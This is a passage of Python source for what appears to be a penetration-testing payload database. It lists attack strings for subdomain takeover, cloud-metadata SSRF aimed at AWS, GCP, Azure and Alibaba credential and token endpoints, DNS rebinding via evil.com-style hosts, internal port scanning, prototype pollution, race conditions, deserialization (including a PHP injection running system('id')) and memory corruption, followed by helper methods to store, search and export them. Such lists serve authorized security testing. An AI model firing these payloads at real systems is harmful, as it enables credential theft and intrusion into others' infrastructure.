                "CNAME pingdom.com",
                "CNAME readme.io",
                "CNAME recaptcha.net",
                "CNAME s3.amazonaws.com",
                "CNAME statuspage.io",
                "CNAME surveymonkey.com",
                "CNAME tumblr.com",
                "CNAME unbounce.com",
                "CNAME uservoice.com",
                "CNAME wpengine.com",
                "CNAME zendesk.com"
            ],
            
            "cloud_metadata": [
                # AWS
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
                "http://169.254.169.254/latest/meta-data/iam/info",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/local-ipv4",
                "http://169.254.169.254/latest/meta-data/public-ipv4",
                
                # AWS IMDSv2
                "http://169.254.169.254/latest/api/token",
                "http://169.254.169.254/latest/meta-data/ (with token)",
                
                # GCP
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
                
                # Azure
                "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
                "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01",
                "http://169.254.169.254/metadata/instance/network?api-version=2017-08-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
                
                # DigitalOcean
                "http://169.254.169.254/metadata/v1.json",
                "http://169.254.169.254/metadata/v1/id",
                "http://169.254.169.254/metadata/v1/region",
                "http://169.254.169.254/metadata/v1/user-data",
                
                # Alibaba
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/user-data/",
                "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
            ],
            
            "dns_rebinding": [
                # DNS rebinding patterns
                "evil.com (alternating IPs: 1.1.1.1, 127.0.0.1)",
                "attacker.net (TTL 0, multiple A records)",
                "rebind.network: 1.2.3.4 then 127.0.0.1",
                "localhost.evil.com",
                "127.0.0.1.nip.io",
                "127.0.0.1.xip.io",
                "127.0.0.1.sslip.io",
                "localtest.me",
                "mail.localhost.sec",
                
                # Service specific
                "169.254.169.254.nip.io",
                "169.254.169.254.xip.io",
                "metadata.google.internal.evil.com",
                "internal.target.com.evil.com"
            ],
            
            "port_scanning": [
                # Common ports
                "http://127.0.0.1:22",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:5432",
                "http://127.0.0.1:6379",
                "http://127.0.0.1:27017",
                "http://127.0.0.1:9200",
                "http://127.0.0.1:5601",
                "http://127.0.0.1:8080",
                "http://127.0.0.1:8443",
                "http://127.0.0.1:8888",
                "http://127.0.0.1:9000",
                
                # Internal services
                "http://127.0.0.1:8081",
                "http://127.0.0.1:8082",
                "http://127.0.0.1:8083",
                "http://127.0.0.1:8000",
                "http://127.0.0.1:3000",
                "http://127.0.0.1:5000",
                
                # Network ranges
                "http://10.0.0.1:80",
                "http://10.0.0.2:80",
                "http://172.16.0.1:80",
                "http://192.168.1.1:80",
                "http://192.168.1.2:80",
                "http://169.254.169.254:80"
            ],
            
            # ========== ADVANCED ==========
            "prototype_pollution": [
                # Client-side
                "__proto__[admin]=true",
                "__proto__.admin=true",
                "__proto__[isAdmin]=true",
                "__proto__.isAdmin=true",
                "constructor.prototype.admin=true",
                "constructor.prototype.isAdmin=true",
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                
                # Server-side
                "__proto__.toString=1",
                "__proto__.hasOwnProperty=1",
                "__proto__.valueOf=1",
                "constructor.prototype.toString=1",
                "constructor.prototype.valueOf=1",
                
                # JSON payloads
                '{"__proto__": {"toString": 1}}',
                '{"__proto__": {"valueOf": 1}}',
                '{"__proto__": {"hasOwnProperty": 1}}',
                '{"constructor": {"prototype": {"toString": 1}}}',
                '{"a": {"__proto__": {"b": true}}}'
            ],
            
            "race_condition": [
                # Parallel requests
                "GET /transfer?amount=1000&to=attacker",
                "POST /cart/checkout (multiple times)",
                "POST /coupon/redeem (multiple times)",
                "POST /vote (multiple times)",
                "POST /like (multiple times)",
                "POST /follow (multiple times)",
                "POST /purchase (multiple times)",
                
                # Timing attacks
                "POST /login (with timing measurements)",
                "POST /reset-password (with race condition)",
                
                # File operations
                "POST /upload (parallel uploads)",
                "POST /delete (parallel deletes)"
            ],
            
            "deserialization": [
                # PHP
                'O:8:"stdClass":0:{}',
                'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                'O:8:"stdClass":2:{s:4:"test";s:4:"test";s:5:"admin";b:1;}',
                'O:12:"PHPObjectInjection":1:{s:7:"inject";s:10:"system(\'id\');";}',
                
                # Java
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==',
                'rO0ABXNyABJqYXZhLmxhbmcuUHJvY2Vzc0ltcGwAAAAAAAAAAQABeHAAAALw',
                
                # Python (pickle)
                'gASVJQAAAAAAAACMCGJ1aWx0aW5zlIwEU29ydJSTlCn/////////fZSHlFKULg==',
                'gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwEU29ydJSTlIwIc3lzdGVtLmlklFKULg==',
                'gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwEU29ydJSTlIwIc3lzdGVtLmlklFKULg==',
                
                # Ruby
                'BAhvOkBBY3RpdmVSZWNvcmQ6OkRlc2VyaWFsaXphdGlvbgA=',
                'BAhvOjpAU2Vzc2lvbjo6RGVzZXJpYWxpemF0aW9uAAA=',
                
                # .NET
                'AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAw=='
            ],
            
            "memory_corruption": [
                # Buffer overflow
                "A" * 1000,
                "A" * 5000,
                "A" * 10000,
                "%x" * 100,
                "%n" * 100,
                
                # Format string
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                
                # Integer overflow
                "2147483648",
                "4294967296",
                "18446744073709551616",
                "-1",
                "0xFFFFFFFF",
                
                # Heap spray
                "<script>for(var i=0;i<1000;i++){var div=document.createElement('div');div.innerHTML='AAAA';document.body.appendChild(div);}</script>"
            ]
        }
    
    def get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads for a specific vulnerability type"""
        return self.payloads.get(vuln_type, [])
    
    def get_payloads_by_category(self, category: str) -> Dict[str, List[str]]:
        """Get all payloads for a category"""
        category_mapping = {
            "injection": ["xss", "sqli", "sqli_blind", "nosqli", "ldapi", "xpathi", "ssti", "lfi", "rce", "xxe", "ssrf"],
            "configuration": ["jwt", "cors", "csp", "http_smuggling", "web_cache", "open_redirect", "crlf"],
            "access_control": ["idor", "privilege_escalation", "broken_access", "mass_assignment"],
            "api_modern": ["graphql", "websocket", "api_fuzzing", "grpc", "serverless"],
            "infrastructure": ["subdomain_takeover", "cloud_metadata", "dns_rebinding", "port_scanning"],
            "advanced": ["prototype_pollution", "race_condition", "deserialization", "memory_corruption"]
        }
        
        result = {}
        vuln_types = category_mapping.get(category.lower(), [])
        for vuln_type in vuln_types:
            if vuln_type in self.payloads:
                result[vuln_type] = self.payloads[vuln_type]
        
        return result
    
    def add_payload(self, vuln_type: str, payload: str):
        """Add a new payload to the database"""
        if vuln_type not in self.payloads:
            self.payloads[vuln_type] = []
        if payload not in self.payloads[vuln_type]:
            self.payloads[vuln_type].append(payload)
            self._save_db()
    
    def add_payloads_bulk(self, vuln_type: str, payloads: List[str]):
        """Add multiple payloads at once"""
        if vuln_type not in self.payloads:
            self.payloads[vuln_type] = []
        
        added = 0
        for payload in payloads:
            if payload not in self.payloads[vuln_type]:
                self.payloads[vuln_type].append(payload)
                added += 1
        
        if added > 0:
            self._save_db()
        
        return added
    
    def remove_payload(self, vuln_type: str, payload: str) -> bool:
        """Remove a payload from the database"""
        if vuln_type in self.payloads and payload in self.payloads[vuln_type]:
            self.payloads[vuln_type].remove(payload)
            self._save_db()
            return True
        return False
    
    def get_all_types(self) -> List[str]:
        """Get all available vulnerability types"""
        return list(self.payloads.keys())
    
    def get_stats(self) -> Dict[str, int]:
        """Get statistics about the payload database"""
        return {vuln_type: len(payloads) for vuln_type, payloads in self.payloads.items()}
    
    def search_payloads(self, keyword: str) -> Dict[str, List[str]]:
        """Search for payloads containing a keyword"""
        results = {}
        keyword = keyword.lower()
        
        for vuln_type, payloads in self.payloads.items():
            matching = [p for p in payloads if keyword in p.lower()]
            if matching:
                results[vuln_type] = matching
        
        return results
    
    def _save_db(self):
        """Save the database to JSON file"""
        try:
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
            with open(self.db_path, 'w', encoding='utf-8') as f:
                json.dump(self.payloads, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"Warning: Could not save payload database: {e}")
    
    def export_payloads(self, format: str = "txt") -> Dict[str, str]:
        """Export payloads in various formats"""
        exports = {}
        
        if format == "txt":
            for vuln_type, payloads in self.payloads.items():
                content = "\n".join(payloads)
                exports[vuln_type] = content
        elif format == "json":
            return {"json": json.dumps(self.payloads, indent=2)}
        elif format == "csv":
            for vuln_type, payloads in self.payloads.items():
                lines = ["Payload"]
                lines.extend(payloads)
                exports[vuln_type] = "\n".join(lines)
        
        return exports

# Singleton instance
payload_db = PayloadDatabase()